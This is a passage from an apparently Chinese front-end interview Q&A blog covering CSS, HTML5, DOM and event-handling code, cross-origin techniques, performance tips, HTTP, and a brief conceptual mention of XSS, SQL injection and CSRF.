top, bottom, left, right z-index 声明）。<br>5.inherit 规定从父元素继承 position 属性的值。</p><blockquote><p>CSS3有哪些新特性？</p></blockquote><p>1）CSS3实现圆角（border-radius），阴影（box-shadow），<br>2）对文字加特效（text-shadow、），线性渐变（gradient），旋转（transform）<br>3）transform:rotate(9deg) scale(0.85,0.90) translate(0px,-30px) skew(-9deg,0deg);// 旋转,缩放,定位,倾斜<br>4）增加了更多的CSS选择器  多背景 rgba<br>5）在CSS3中唯一引入的伪类是 ::selection.<br>6）媒体查询，多栏布局<br>7）border-image</p><blockquote><p>为什么要初始化CSS样式。</p></blockquote><p>因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。</p><blockquote><p>对BFC规范的理解？</p></blockquote><p>BFC，块级格式化上下文，一个创建了新的BFC的盒子是独立布局的，盒子里面的子元素的样式不会影响到外面的元素。在同一个 BFC 中的两个毗邻的块级盒在垂直方向（和布局方向有关系）的 margin 会发生折叠。<br>W3C CSS 2.1 规范中的一个概念，它决定了元素如何对其内容进行布局，以及与其他元素的关系和相互作用。</p><blockquote><p>解释下 CSS sprites，以及你要如何在页面或网站中使用它。</p></blockquote><p>CSS Sprites 其实就是把网页中一些背景图片整合到一张图片文件中，再利用 CSS 的”<code>background-image</code>“，”<code>background-repeat</code>“，”<code>background-position</code>“ 的组合进行背景定位，<code>background-position</code> 可以用数字能精确的定位出背景图片的位置。这样可以减少很多图片请求的开销，因为请求耗时比较长；请求虽然可以并发，但是也有限制，一般浏览器都是6个。对于未来而言，就不需要这样做了，因为有了 http2。</p><blockquote><p>说说你对语义化的理解？</p></blockquote><p>1） 去掉或者丢失样式的时候能够让页面呈现出清晰的结构<br>2） 有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息：爬虫依赖于标签来确定上下文和各个关键字的权重；<br>3） 方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；<br>4） 便于团队开发和维护，语义化使得网页更具可读性，是进一步开发网页的必要步骤，遵循W3C标准的团队都遵循这个标准，可以减少差异化。</p><blockquote><p>Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?</p></blockquote><p>1） <code>&lt;!DOCTYPE&gt;</code>声明位于文档中的最前面，处于 <html> 标签之前。告知浏览器以何种模式来渲染文档。<br>2） 严格模式的排版和 JS 运作模式是  以该浏览器支持的最高标准运行。<br>3） 在混杂模式中，页面以宽松的向后兼容的方式显示。模拟老式浏览器的行为以防止站点无法工作。<br>4） DOCTYPE不存在或格式不正确会导致文档以混杂模式呈现。</html></p><blockquote><p>你知道多少种Doctype文档类型？</p></blockquote><p>1） 该标签可声明三种 DTD 类型，分别表示严格版本、过渡版本以及基于框架的 HTML 文档。<br>2） HTML 4.01 规定了三种文档类型：Strict、Transitional 以及 Frameset。<br>3） XHTML 1.0 规定了三种 XML 文档类型：Strict、Transitional 以及 Frameset。<br>4） Standards （标准）模式（也就是严格呈现模式）用于呈现遵循最新标准的网页，而 Quirks（包容）模式（也就是松散呈现模式或者兼容模式）用于呈现为传统浏览器而设计的网页。</p><blockquote><p>HTML与XHTML——二者有什么区别</p></blockquote><p>最主要的不同：<br>XHTML 元素必须被正确地嵌套。<br>XHTML 元素必须被关闭。<br>标签名必须用小写字母。<br>XHTML 文档必须拥有根元素。</p><blockquote><p>html常见兼容性问题？</p></blockquote><p>1） png24位的图片在iE6浏览器上出现背景<br>解决方案：做成PNG8，也可以引用一段脚本处理.</p><p>2） 浏览器默认的margin和padding不同<br>解决方案：加一个全局的 <code>*{margin:0;padding:0;}</code>来统一。</p><p>3） IE6双边距bug：在IE6下，如果对元素设置了浮动，同时又设置了margin-left或margin-right，margin值会加倍。<br><code>#box{ float:left; width:10px; margin:0 0 0 10px;}</code><br>这种情况之下IE会产生20px的距离<br>解决方案：在float的标签样式控制中加入<code>_display:inline;</code> 将其转化为行内属性。( _ 这个符号只有ie6会识别)</p><p>4） 渐进识别的方式，从总体中逐渐排除局部。<br>首先，巧妙的使用“\9”这一标记，将IE游览器从所有情况中分离出来。<br>接着，再次使用 “+” 将IE8和IE7、IE6分离开来，这样IE8已经独立识别。<br><figure class="highlight scss"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="selector-class">.bb</span>&#123;</div><div class="line">    <span class="attribute">background-color</span>:<span class="number">#f1ee18</span>; <span class="comment">/*所有识别*/</span></div><div class="line">    <span class="selector-class">.background-color</span>:<span class="number">#00deff</span>\<span class="number">9</span>; <span class="comment">/*IE6、7、8识别*/</span></div><div class="line">    +<span class="attribute">background-color</span>:<span class="number">#a200ff</span>; <span class="comment">/*IE6、7识别*/</span></div><div class="line">    _background-<span class="attribute">color</span>:<span class="number">#1e0bd1</span>; <span class="comment">/*IE6识别*/</span> </div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>5）IE下，可以使用获取常规属性的方法来获取自定义属性，也可以使用 getAttribute() 获取自定义属性；Firefox下,只能使用getAttribute()获取自定义属性<br>解决方法：统一通过getAttribute()获取自定义属性</p><p>6）IE下，event对象有 x、y 属性，但是没有 pageX、pageY属性; Firefox下，event对象有 pageX、pageY 属性，但是没有 x、y 属性<br>解决方法：（条件注释）缺点是在IE浏览器下可能会增加额外的HTTP请求数。</p><p>7） Chrome 中文界面下默认会将小于 12px 的文本强制按照 12px 显示<br>解决方法：可通过加入 CSS 属性 -webkit-text-size-adjust: none; 解决</p><p>8） 超链接访问过后 hover 样式就不出现了，被点击访问过的超链接样式不在具有 hover 和 active 了<br>解决方法：改变CSS属性的排列顺序 L-V-H-A<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">a</span>:link &#123;&#125;</div><div class="line"><span class="selector-tag">a</span>:visited &#123;&#125;</div><div class="line"><span class="selector-tag">a</span>:hover &#123;&#125;</div><div class="line"><span class="selector-tag">a</span>:active &#123;&#125;</div></pre></td></tr></table></figure></p><p>9）怪异模式问题：漏写 DTD 声明，Firefox 仍然会按照标准模式来解析网页，但在 IE 中会触发怪异模式。为避免怪异模式给我们带来不必要的麻烦，最好养成书写 DTD 声明的好习惯。现在可以使用<a href="http://www.w3.org/TR/html5/single-page.html" target="_blank" rel="external">html5</a> 推荐的写法：<code>&lt;!DOCTYPE html&gt;</code></p><p>10） 上下margin重合问题：ie和ff都存在，相邻的两个div的margin-left和margin-right不会重合，但是margin-top和margin-bottom却会发生重合。<br>解决方法：养成良好的代码编写习惯，同时采用margin-top或者同时采用margin-bottom。</p><p>11）ie6对png图片格式支持不好<br>解决方案：引用一段脚本处理</p><blockquote><p>解释下浮动和它的工作原理？清除浮动的技巧</p></blockquote><p>浮动元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框停留。</p><p>1）使用空标签清除浮动。<br>这种方法是在所有浮动标签后面添加一个空标签 定义css clear:both. 弊端就是增加了无意义标签。</p><p>2）使用overflow。<br>给包含浮动元素的父标签添加css属性 overflow:auto; zoom:1; zoom:1用于兼容IE6。</p><p>3）使用after伪对象清除浮动。<br>该方法只适用于非IE浏览器。具体写法可参照以下示例。使用中需注意以下几点。一、该方法中必须为需要清除浮动元素的伪对象中设置 height:0，否则该元素会比实际高出若干像素；</p><p>可以给父元素设置overflow：auto或者hidden</p><blockquote><p>IE 8以下版本的浏览器中的盒模型有什么不同</p></blockquote><p>IE8以下浏览器的盒模型中定义的元素的宽高包括内边距和边框</p><blockquote><p>DOM操作——怎样添加、移除、移动、复制、创建和查找节点。</p></blockquote><p>1） 创建新节点<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">createDocumentFragment</span><span class="params">()</span></span> <span class="comment">// 创建一个DOM片段</span></div><div class="line"><span class="function"><span class="title">createElement</span><span class="params">()</span></span> <span class="comment">// 创建一个具体的元素</span></div><div class="line"><span class="function"><span class="title">createTextNode</span><span class="params">()</span></span> <span class="comment">// 创建一个文本节点</span></div></pre></td></tr></table></figure></p><p>2） 添加、移除、替换、插入<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">appendChild</span><span class="params">()</span></span></div><div class="line"><span class="function"><span class="title">removeChild</span><span class="params">()</span></span></div><div class="line"><span class="function"><span class="title">replaceChild</span><span class="params">()</span></span></div><div class="line"><span class="function"><span class="title">insertBefore</span><span class="params">()</span></span> <span class="comment">// 在已有的子节点前插入一个新的子节点</span></div></pre></td></tr></table></figure></p><p>3） 查找<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">getElementsByTagName</span><span class="params">()</span></span> <span class="comment">// 通过标签名称</span></div><div class="line"><span class="function"><span class="title">getElementsByName</span><span class="params">()</span></span> <span class="comment">// 通过元素的Name属性的值(IE容错能力较强，会得到一个数组，其中包括id等于name值的)</span></div><div class="line"><span class="function"><span class="title">getElementById</span><span class="params">()</span></span> <span class="comment">// 通过元素Id，唯一性</span></div></pre></td></tr></table></figure></p><blockquote><p>html5有哪些新特性、移除了那些元素？如何处理HTML5新标签的浏览器兼容问题？如何区分 HTML 和 HTML5？</p></blockquote><p>新特性：<br>HTML5 现在已经不是 SGML 的子集，主要是关于图像，位置，存储，多任务等功能的增加。<br>1） 拖拽释放(Drag and drop) API<br>2） 语义化更好的内容标签（header,nav,footer,aside,article,section）<br>3） 音频、视频API(audio,video)<br>4） 画布(Canvas) API<br>5） 地理(Geolocation) API<br>6） 本地离线存储 localStorage 长期存储数据，浏览器关闭后数据不丢失；<br>7） sessionStorage 的数据在浏览器关闭后自动删除<br>8） 表单控件，calendar、date、time、email、url、search<br>9） 新的技术webworker, websocket, Geolocation</p><p>移除的元素：<br>1） 纯表现的元素：basefont，big，center，font, s，strike，tt，u；<br>2） 对可用性产生负面影响的元素：frame，frameset，noframes；</p><p>支持HTML5新标签：<br>1） IE8/IE7/IE6支持通过 document.createElement 方法产生的标签，可以利用这一特性让这些浏览器支持 HTML5 新标签，浏览器支持新标签后，还需要添加标签默认的样式（当然最好的方式是直接使用成熟的框架、使用最多的是html5shiv框架）：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">&lt;!--[if lt IE 9]&gt; </span></div><div class="line">&lt;script&gt; src="http://html5shiv.googlecode.com/svn/trunk/html5.js"&lt;/script&gt; </div><div class="line">&lt;![endif]--&gt;</div></pre></td></tr></table></figure></p><p>如何区分：<br>DOCTYPE声明新增的结构元素、功能元素</p><blockquote><p>iframe的优缺点？</p></blockquote><p>优点：<br>1） 解决加载缓慢的第三方内容如图标和广告等的加载问题<br>2） Security sandbox<br>3） 并行加载脚本</p><p>缺点：<br>1） iframe会阻塞主页面的Onload事件<br>2） 即时内容为空，加载也需要时间<br>3） 没有语意</p><blockquote><p>如何实现浏览器内多个标签页之间的通信?</p></blockquote><p>调用 localstorge、cookies 等本地存储方式</p><blockquote><p>webSocket 如何兼容低浏览器？</p></blockquote><p>Adobe Flash Socket 、 ActiveX HTMLFile (IE) 、 基于 multipart 编码发送 XHR 、 基于长轮询的 XHR</p><blockquote><p>线程与进程的区别</p></blockquote><p>1） 一个程序至少有一个进程,一个进程至少有一个线程<br>2） 线程的划分尺度小于进程，使得多线程程序的并发性高<br>3） 另外，进程在执行过程中拥有独立的内存单元，而多个线程共享内存，从而极大地提高了程序的运行效率<br>4） 线程在执行过程中与进程还是有区别的。每个独立的线程有一个程序运行的入口、顺序执行序列和程序的出口。但是线程不能够独立执行，必须依存在应用程序中，由应用程序提供多个线程执行控制<br>5） 从逻辑角度来看，多线程的意义在于一个应用程序中，有多个执行部分可以同时执行。但操作系统并没有将多个线程看做多个独立的应用，来实现进程的调度和管理以及资源分配。这就是进程和线程的重要区别</p><blockquote><p>你如何对网站的文件和资源进行优化？</p></blockquote><p>期待的解决方案包括：<br>1） 文件合并<br>2） 文件最小化/文件压缩<br>3） 使用 CDN 托管<br>4） 缓存的使用（多个域名来提供缓存）<br>5） 其他</p><blockquote><p>请说出三种减少页面加载时间的方法</p></blockquote><p>1） 优化图片<br>2） 图像格式的选择（GIF：提供的颜色较少，可用在一些对颜色要求不高的地方）<br>3） 优化CSS（压缩合并css，如 margin-top, margin-left…)<br>4） 网址后加斜杠（如www.campr.com/目录，会判断这个目录是什么文件类型，或者是目录。）<br>5） 标明高度和宽度（如果浏览器没有找到这两个参数，它需要一边下载图片一边计算大小，如果图片很多，浏览器需要不断地调整页面。这不但影响速度，也影响浏览体验。<br>当浏览器知道了高度和宽度参数后，即使图片暂时无法显示，页面上也会腾出图片的空位，然后继续加载后面的内容。从而加载时间快了，浏览体验也更好了）<br>6） 减少http请求（合并文件，合并图片）</p><blockquote><p>你都使用哪些工具来测试代码的性能？</p></blockquote><p>1） Profiler<br>2） <a href="http://jsperf.com/nexttick-vs-setzerotimeout-vs-settimeout" target="_blank" rel="external">JSPerf</a><br>3） Dromaeo</p><blockquote><p>什么是 FOUC（无样式内容闪烁）？你如何来避免 FOUC？</p></blockquote><p>FOUC - Flash Of Unstyled Content 文档样式闪烁<br> <code>&lt;style type=&quot;text/css&quot; media=&quot;all&quot;&gt;@import &quot;../fouc.css&quot;;&lt;/style&gt;</code><br>而引用CSS文件的@import就是造成这个问题的罪魁祸首。IE会先加载整个HTML文档的DOM，然后再去导入外部的CSS文件，因此，在页面DOM加载完成到CSS导入完成中间会有一段时间页面上的内容是没有样式的，这段时间的长短跟网速，电脑速度都有关系。<br>解决方法简单的出奇，只要在<code>&lt;head&gt;</code>之间加入一个<code>&lt;link&gt;</code>或者<code>&lt;script&gt;</code>元素就可以了。</p><blockquote><p>null和undefined的区别？</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// event(事件)工具集，来源：github.com/markyun</span></div><div class="line">markyun.Event = &#123;</div><div class="line"><span class="comment">// 页面加载完成后</span></div><div class="line">readyEvent : <span class="function"><span class="keyword">function</span>(<span class="params">fn</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (fn==<span class="literal">null</span>) &#123;</div><div class="line">fn=<span class="built_in">document</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> oldonload = <span class="built_in">window</span>.onload;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">window</span>.onload != <span class="string">'function'</span>) &#123;</div><div class="line"><span class="built_in">window</span>.onload = fn;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">oldonload();</div><div class="line">fn();</div><div class="line">&#125;;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 视能力分别使用dom0||dom2||IE方式 来绑定事件</span></div><div class="line"><span class="comment">// 参数： 操作的元素,事件名称 ,事件处理程序</span></div><div class="line">addEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (element.addEventListener) &#123;</div><div class="line"><span class="comment">//事件类型、需要执行的函数、是否捕捉</span></div><div class="line">element.addEventListener(type, handler, <span class="literal">false</span>);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.attachEvent) &#123;</div><div class="line">element.attachEvent(<span class="string">'on'</span> + type, <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">handler.call(element);</div><div class="line">&#125;);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">element[<span class="string">'on'</span> + type] = handler;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 移除事件</span></div><div class="line">removeEvent : <span class="function"><span class="keyword">function</span>(<span class="params">element, type, handler</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (element.removeEventListener) &#123;</div><div class="line">element.removeEventListener(type, handler, <span class="literal">false</span>);</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (element.datachEvent) &#123;</div><div class="line">element.detachEvent(<span class="string">'on'</span> + type, handler);</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">element[<span class="string">'on'</span> + type] = <span class="literal">null</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 阻止事件 (主要是事件冒泡，因为IE不支持事件捕获)</span></div><div class="line">stopPropagation : <span class="function"><span class="keyword">function</span>(<span class="params">ev</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (ev.stopPropagation) &#123;</div><div class="line">ev.stopPropagation();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">ev.cancelBubble = <span class="literal">true</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 取消事件的默认行为</span></div><div class="line">preventDefault : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line"><span class="keyword">if</span> (event.preventDefault) &#123;</div><div class="line">event.preventDefault();</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">event.returnValue = <span class="literal">false</span>;</div><div class="line">&#125;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 获取事件目标</span></div><div class="line">getTarget : <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line"><span class="keyword">return</span> event.target || event.srcElement;</div><div class="line">&#125;,</div><div class="line"><span class="comment">// 获取event对象的引用，取到事件的所有信息，确保随时能使用event；</span></div><div class="line">getEvent : <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</div><div class="line"><span class="keyword">var</span> ev = e || <span class="built_in">window</span>.event;</div><div class="line"><span class="keyword">if</span> (!ev) &#123;</div><div class="line"><span class="keyword">var</span> c = <span class="keyword">this</span>.getEvent.caller;</div><div class="line"><span class="keyword">while</span> (c) &#123;</div><div class="line">ev = c.arguments[<span class="number">0</span>];</div><div class="line"><span class="keyword">if</span> (ev &amp;&amp; Event == ev.constructor) &#123;</div><div class="line"><span class="keyword">break</span>;</div><div class="line">&#125;</div><div class="line">c = c.caller;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> ev;</div><div class="line">&#125;</div><div class="line">&#125;;</div></pre></td></tr></table></figure><blockquote><p>new操作符具体干了什么呢?</p></blockquote><p>1） 创建一个空对象，并且 this 变量引用该对象，同时还继承了该函数的原型<br>2） 属性和方法被加入到 this 引用的对象中<br>3） 新创建的对象由 this 所引用，并且最后隐式的返回 this<br><figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">var obj  = &#123;&#125;<span class="comment">;</span></div><div class="line">obj.__proto__ = Base.prototype<span class="comment">;</span></div><div class="line">Base.call(obj)<span class="comment">;</span></div></pre></td></tr></table></figure></p><blockquote><p>对JSON 的了解？</p></blockquote><p>JSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。它是基于JavaScript的一个子集。数据格式简单, 易于读写, 占用带宽小。<br> <code>{&quot;age&quot;:&quot;12&quot;, &quot;name&quot;:&quot;back&quot;}</code></p><blockquote><p>js延迟加载的方式有哪些？</p></blockquote><p>1） defer和async<br>2） 动态创建DOM方式（创建script，插入到DOM中，加载完毕后callBack）<br>3） 按需异步载入js</p><blockquote><p>如何解决跨域问题?</p></blockquote><p>1） jsonp（jsonp 的原理是动态插入 script 标签）<br>2） document.domain + iframe<br>3） window.name、window.postMessage<br>4） 服务器上设置代理页面</p><blockquote><p>documen.write和 innerHTML 的区别</p></blockquote><p><code>document.write</code> 只能重绘整个页面</p><p><code>innerHTML</code> 可以重绘页面的一部分</p><blockquote><p>.call() 和 .apply() 的作用？</p></blockquote><p>改变上下文，即this的指向</p><blockquote><p>哪些操作会造成内存泄漏？</p></blockquote><p>内存泄漏指任何对象在您不再拥有或需要它之后仍然存在。<br>垃圾回收器定期扫描对象，并计算引用了每个对象的其他对象的数量。如果一个对象的引用数量为 0（没有其他对象引用过该对象），或对该对象的惟一引用是循环的，那么该对象的内存即可回收。</p><p>1） setTimeout 的第一个参数使用字符串而非函数的话，会引发内存泄漏。<br>2） 闭包<br>3） 控制台日志<br>4） 循环（在两个对象彼此引用且彼此保留时，就会产生一个循环）</p><blockquote><p>如何判断当前脚本运行在浏览器还是node环境中？</p></blockquote><p>通过判断 Global 对象是否为window，如果不为window，当前脚本没有运行在浏览器中。即在node中的全局变量是global ,浏览器的全局变量是window。 可以通过该全局变量是否定义来判断宿主环境</p><blockquote><p>什么叫优雅降级和渐进增强？</p></blockquote><p>1） 优雅降级：Web站点在所有新式浏览器中都能正常工作，如果用户使用的是老式浏览器，则代码会检查以确认它们是否能正常工作。由于IE独特的盒模型布局问题，针对不同版本的IE的hack实践过优雅降级了,为那些无法支持功能的浏览器增加候选方案，使之在旧式浏览器上以某种形式降级体验却不至于完全失效。</p><p>2） 渐进增强：从被所有浏览器支持的基本功能开始，逐步地添加那些只有新式浏览器才支持的功能,向页面增加无害于基础浏览器的额外样式和功能的。当浏览器支持时，它们会自动地呈现出来并发挥作用。</p><blockquote><p>对Node的优点和缺点提出了自己的看法？</p></blockquote><p>优点：<br>1） 因为Node是基于事件驱动和无阻塞的，所以非常适合处理并发请求，因此构建在Node上的代理服务器相比其他技术实现（如Ruby）的服务器表现要好得多。<br>2） 与Node代理服务器交互的客户端代码是由javascript语言编写的，因此客户端和服务器端都用同一种语言编写，这是非常美妙的事情。</p><p>缺点：<br>1） Node是一个相对新的开源项目，所以不太稳定，它总是一直在变。<br>2） 缺少足够多的第三方库支持。看起来，就像是Ruby/Rails当年的样子（第三方库现在已经很丰富了，所以这个缺点可以说不存在了）。</p><blockquote><p>对前端界面工程师这个职位是怎么样理解的？它的前景会怎么样？</p></blockquote><p>前端是最贴近用户的程序员，比后端、数据库、产品经理、运营、安全都近。<br>1） 实现界面交互<br>2） 提升用户体验<br>3） 有了Node.js，前端可以实现服务端的一些事情</p><p>前景：<br>1） 前端是最贴近用户的程序员，前端的能力就是能让产品从 90分进化到 100 分，甚至更好<br>2） 参与项目，快速高质量完成实现效果图，精确到1px；<br>3） 与团队成员，UI设计，产品经理的沟通；<br>4） 做好的页面结构，页面重构和用户体验；<br>5） 处理hack，兼容、写出优美的代码格式；<br>6） 针对服务器的优化、拥抱最新前端技术。</p><blockquote><p>你有哪些性能优化的方法？</p></blockquote><p>1） 减少http请求次数：CSS Sprites, JS、CSS 源码压缩、图片大小控制合适；网页 Gzip，CDN 托管，data 缓存 ，图片服务器<br>2） 前端模板 JS + 数据，减少由于HTML标签导致的带宽浪费，前端用变量保存 AJAX 请求结果，每次操作本地变量，不用请求，减少请求次数<br>3） 用 innerHTML 代替 DOM 操作，减少 DOM 操作次数，优化 javascript 性能<br>4） 当需要设置的样式很多时设置 className 而不是直接操作 style<br>5） 少用全局变量、缓存DOM节点查找的结果。减少 IO 读取操作<br>6） 避免使用 CSS Expression（css表达式)又称 Dynamic properties(动态属性)<br>7） 图片预加载，将样式表放在顶部，将脚本放在底部，加上时间戳</p><blockquote><p>http状态码有那些？分别代表是什么意思？</p></blockquote><p><a href="http://wangsiyuan233.cn/2018/04/02/38%E8%81%8A%E8%81%8A%E7%B3%BB%E5%88%97-3/" target="_blank" rel="external">聊聊系列(3)– HTTP</a></p><blockquote><p>一个页面从输入 URL 到页面加载显示完成，这个过程中都发生了什么？</p></blockquote><p>分为4个步骤：<br>1） 当发送一个 URL 请求时，不管这个 URL 是 Web 页面的 URL 还是 Web 页面上每个资源的 URL，浏览器都会开启一个线程来处理这个请求，同时在远程 DNS 服务器上启动一个 DNS 查询。这能使浏览器获得请求对应的 IP 地址。<br>2） 浏览器与远程 Web 服务器通过 TCP 三次握手协商来建立一个 TCP/IP 连接。该握手包括一个同步报文，一个同步-应答报文和一个应答报文，这三个报文在 浏览器和服务器之间传递。该握手首先由客户端尝试建立起通信，而后服务器应答并接受客户端的请求，最后由客户端发出该请求已经被接受的报文。<br>3） 一旦 TCP/IP 连接建立，浏览器会通过该连接向远程服务器发送 HTTP 的 GET 请求。远程服务器找到资源并使用 HTTP 响应返回该资源，值为 200 的 HTTP 响应状态表示一个正确的响应。<br>4） 此时，Web 服务器提供资源服务，客户端开始下载资源。</p><p>请求返回后，便进入了我们关注的前端模块<br>简单来说，浏览器会解析 HTML 生成 DOM Tree，其次会根据 CSS 生成 CSS Rule Tree，而 javascript 又可以根据 DOM API 操作 DOM</p><blockquote><p>平时如何管理你的项目？</p></blockquote><p>1） 先期团队必须确定好全局样式（globe.css），编码模式(utf-8) 等<br>2） 编写习惯必须一致（例如都是采用继承式的写法，单样式都写成一行）<br>3） 标注样式编写人，各模块都及时标注（标注关键样式调用的地方）<br>4） 页面进行标注（例如 页面 模块 开始和结束）<br>5） CSS 跟 HTML 分文件夹并行存放，命名都得统一（例如 style.css）<br>6） JS 分文件夹存放 命名以该 JS 功能为准的英文翻译<br>7） 图片采用整合的 images.png png8 格式文件使用 尽量整合在一起使用方便将来的管理 </p><blockquote><p>说说最近最流行的一些东西吧？常去的哪些网站？</p></blockquote><p>最流行的一些东西：<br>1） Node.js<br>2） Mongodb<br>3） npm<br>4） MVVM<br>5） MEAN<br>6） three.js<br>7） React</p><p>常去的网站：<br>1） 牛客网<br>2） Github<br>3） CSDN</p><blockquote><p>javascript对象的几种创建方式</p></blockquote><p>1） 工厂模式<br>2） 构造函数模式<br>3） 原型模式<br>4） 混合构造函数和原型模式<br>5） 动态原型模式<br>6） 寄生构造函数模式<br>7） 稳妥构造函数模式</p><blockquote><p>javascript继承的 6 种方法</p></blockquote><p>1） 原型链继承<br>2） 借用构造函数继承<br>3） 组合继承(原型+借用构造)<br>4） 原型式继承<br>5） 寄生式继承<br>6） 寄生组合式继承</p><blockquote><p>ajax 的过程是怎样的</p></blockquote><p>1） 创建XMLHttpRequest对象,也就是创建一个异步调用对象<br>2） 创建一个新的HTTP请求,并指定该HTTP请求的方法、URL及验证信息<br>3） 设置响应HTTP请求状态变化的函数<br>4） 发送HTTP请求<br>5） 获取异步调用返回的数据<br>6） 使用JavaScript和DOM实现局部刷新</p><blockquote><p>异步加载和延迟加载</p></blockquote><p>1） 异步加载的方案： 动态插入 script 标签<br>2） 通过 ajax 去获取 js 代码，然后通过 eval 执行<br>3） script 标签上添加 defer 或者 async 属性<br>4） 创建并插入 iframe，让它异步执行 js<br>5） 延迟加载：有些 js 代码并不是页面初始化的时候就立刻需要的，而稍后的某些情况才需要的</p><blockquote><p>前端的安全问题？</p></blockquote><p>1） XSS<br>2） sql注入<br>3） CSRF：是跨站请求伪造，很明显根据刚刚的解释，他的核心也就是请求伪造，通过伪造身份提交POST和GET请求来进行跨域的攻击</p><p>完成CSRF需要两个步骤：<br>1） 登陆受信任的网站A，在本地生成 COOKIE<br>2） 在不登出A的情况下，或者本地 COOKIE 没有过期的情况下，访问危险网站B。</p><blockquote><p>ie 各版本和 chrome 可以并行下载多少个资源</p></blockquote><p>1） IE6 2 个并发<br>2） iE7 升级之后的 6 个并发，之后版本也是 6 个<br>3） Firefox，chrome 也是6个</p><blockquote><p>javascript里面的继承怎么实现，如何避免原型链上面的对象共享</p></blockquote><p>用构造函数和原型链的混合模式去实现继承，避免对象共享可以参考经典的extend()函数，很多前端框架都有封装的，就是用一个空函数当做中间变量。</p><blockquote><p>grunt， YUI compressor 和 google clojure用来进行代码压缩的用法。</p></blockquote><p><strong>grunt：</strong><br>UglifyJS 是基于 NodeJS 的 Javascript 语法解析/压缩/格式化工具<br><a href="http://lisperator.net/uglifyjs/" target="_blank" rel="external">官网：</a> || <a href="https://github.com/mishoo/UglifyJS2" target="_blank" rel="external">或者：</a><br>安装：<br> <code>$ npm install uglify-js -g</code><br>使用方法见官网 